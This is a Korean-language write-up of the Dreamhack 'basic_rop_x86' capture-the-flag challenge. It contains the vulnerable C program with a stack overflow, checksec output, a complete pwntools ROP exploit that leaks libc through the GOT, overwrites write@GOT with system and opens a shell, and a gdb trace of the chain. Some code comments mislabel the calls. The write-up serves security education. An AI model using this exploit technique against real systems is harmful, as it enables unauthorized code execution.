
# 문제 코드
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

# 분석
```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/basic_rop_x86]
└─$ checksec basic_rop_x86
[*] '/home/foo1/Desktop/Dreamhack/basic_rop_x86/basic_rop_x86'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

x86이므로 x64와 호출 방식이 다름.
그 외의 공격 방식은 일반적인 ROP와 동일함

# exploit
```python
from pwn import *

p=process('./basic_rop_x86')
#p=gdb.debug('./basic_rop_x86')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')

#p=remote('host3.dreamhack.games',14443)
#libc=ELF('./libc.so.6')

e=ELF('./basic_rop_x86')
context.log_level='DEBUG'

read_got=e.got['read']
write_got=e.got['write']
read_plt=e.plt['read']
write_plt=e.plt['write']
read_offset=libc.symbols['read']
write_offset=libc.symbols['write']
system_offset=libc.symbols["system"]
pop3gdgt=0x08048689
bss = e.bss()

buf_size=0x44
sfp_size=0x4

payload=b''
payload+=b'a'*(buf_size+sfp_size)

# write(1,read_got,4)
payload+=p32(write_plt)
payload+=p32(pop3gdgt)
payload+=p32(1)
payload+=p32(read_got)
payload+=p32(4)

# read(0,bss,8)
payload+=p32(read_plt)
payload+=p32(pop3gdgt)
payload+=p32(0)
payload+=p32(bss)
payload+=p32(8)

# read(0,read_got,4)
payload+=p32(read_plt)
payload+=p32(pop3gdgt)
payload+=p32(0)
payload+=p32(write_got)
payload+=p32(4)

# read("/bin/sh")
payload+=p32(write_plt)
payload+=p32(0)
payload+=p32(bss)

p.send(payload)

p.recvuntil(b'a'*0x40)	# why 0x40 byte..?
read=u32(p.recvn(4))
lb=read-read_offset
system=lb+system_offset

p.send(b'/bin/sh\x00')
p.sendline(p32(system))
p.interactive()
```

위의 페이로드를 넣고 동작시켰을 때, 동적 분석을 해보면 페이로드가 어떻게 동작하는지 시각적으로 확인할 수 있음
```sh

   0xf7d0a2ac <write+60>              ja     write+144                    <write+144>
 
   0xf7d0a2ae <write+62>              add    esp, 0x10
   0xf7d0a2b1 <write+65>              pop    ebx
   0xf7d0a2b2 <write+66>              pop    esi
   0xf7d0a2b3 <write+67>              pop    edi
 ► 0xf7d0a2b4 <write+68>              ret                                  <0x8048689; __libc_csu_init+89>
    ↓
   0x8048689  <__libc_csu_init+89>    pop    esi
   0x804868a  <__libc_csu_init+90>    pop    edi
   0x804868b  <__libc_csu_init+91>    pop    ebp
   0x804868c  <__libc_csu_init+92>    ret    
    ↓
   0x80483f0  <read@plt>              jmp    dword ptr [0x804a00c]         <read>


00:0000│ esp 0xffa2f610 —▸ 0x8048689 (__libc_csu_init+89) ◂— pop esi
01:0004│     0xffa2f614 ◂— 0x1
02:0008│     0xffa2f618 —▸ 0x804a00c (read@got[plt]) —▸ 0xf7d0a1a0 (read) ◂— endbr32 
03:000c│     0xffa2f61c ◂— 0x4
04:0010│     0xffa2f620 —▸ 0x80483f0 (read@plt) ◂— jmp dword ptr [0x804a00c]
05:0014│     0xffa2f624 —▸ 0x8048689 (__libc_csu_init+89) ◂— pop esi
06:0018│     0xffa2f628 ◂— 0x0
07:001c│     0xffa2f62c —▸ 0x804a040 (stdin@@GLIBC_2.0) —▸ 0xf7e2a620 (_IO_2_1_stdin_) ◂— 0xfbad208b


```